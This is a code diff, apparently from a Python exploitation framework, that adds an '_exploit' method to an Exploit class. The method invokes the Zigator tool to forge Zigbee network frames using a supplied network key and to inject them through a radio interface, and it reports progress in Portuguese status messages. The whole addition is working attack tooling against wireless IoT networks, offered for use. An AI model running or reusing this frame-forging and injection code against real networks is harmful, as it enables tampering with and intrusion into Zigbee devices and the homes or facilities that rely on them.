@@ -371,3 +371,49 @@ class Exploit(Exploit):
         handler = dispatch.get(mode)
         if handler:
             handler()
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: Zigator-based frame forge and inject chain."""
+        mode = str(self.mode).strip().lower()
+        if mode not in ("forge", "inject"):
+            return
+
+        zigator = _resolve_zigator(str(getattr(self, "zigator_path", "")))
+        if not zigator:
+            print_warning("Zigator não disponível para E2E")
+            return
+
+        if mode == "forge":
+            nwk_key = str(self.nwk_key).strip()
+            if not nwk_key or not self._validate_hex_key(nwk_key):
+                return
+            out_dir = self._ensure_output_dir()
+            if not out_dir:
+                return
+            forged_pcap = os.path.join(out_dir, "forged_frame.pcap")
+            cmd = [zigator, "forge", "--nwk-key", nwk_key, "--output", forged_pcap]
+            print_status(f"E2E: Forging frame com Zigator: {' '.join(cmd)}")
+            try:
+                result = subprocess.run(cmd, capture_output=True, timeout=15, check=False)
+                if result.returncode == 0:
+                    print_success(f"Frame forjado salvo em {forged_pcap}")
+                else:
+                    print_warning(f"Zigator forge retornou código {result.returncode}")
+            except Exception as exc:
+                print_error(f"Zigator forge falhou: {exc}")
+
+        elif mode == "inject":
+            iface = str(self.interface).strip()
+            if not iface:
+                print_warning("Sem interface para injeção")
+                return
+            cmd = [zigator, "inject", "--interface", iface]
+            print_status(f"E2E: Injetando frame via Zigator: {' '.join(cmd)}")
+            try:
+                result = subprocess.run(cmd, capture_output=True, timeout=30, check=False)
+                if result.returncode == 0:
+                    print_success("Frame injetado com sucesso via Zigator")
+            except Exception as exc:
+                print_error(f"Zigator inject falhou: {exc}")
